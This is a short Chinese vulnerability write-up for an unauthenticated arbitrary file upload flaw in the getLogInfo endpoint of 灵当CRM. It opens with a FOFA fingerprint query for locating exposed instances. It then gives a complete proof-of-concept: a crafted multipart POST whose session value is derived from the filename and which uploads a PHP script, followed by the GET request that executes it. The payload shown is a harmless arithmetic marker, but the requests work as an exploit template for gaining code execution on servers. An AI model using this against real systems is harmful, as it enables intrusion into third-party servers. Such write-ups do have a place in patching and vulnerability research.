## 灵当CRM getLogInfo 任意文件上传漏洞

## 漏洞描述
灵当CRM `getLogInfo` 接口缺少鉴权与类型限制，可被利用上传任意脚本文件，最终获取服务器权限。

## 网络空间测绘
```
fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM" || body="include/js/ldAjax.js" || title="连接ERP服务管理控制台" && body="登录管理后台"
```

## POC
构造时候注意两个地方Uploadfilename的值需要与Sessionvalue值对应，而Sessionvalue值为 md5(uploadfileitwkqx.php......)的结果
```
POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?callednumber&gettype=uploadfile&sessionvalue=4c27a43b8db69ca2a504d7be0026a480&uploadfilename=itwkqx.php HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary7MA4YnkkTrZu0gW
Content-Length: 231

---WebKitFormBoundary7MA4YnkkTrZu0gW
Content-Disposition: form-data; name="uploaded_file"; filename="itwkqx.avi"
Content-Type: image/jpeg

<?php print(111*222);unlink(__FILE__);?>

---WebKitFormBoundary7MA4YnkkTrZu0gW--
```
```
GET /crm/storage/mobilecalllog/2025/10/20/itwkqx.php HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

## 参考
- 社区情报

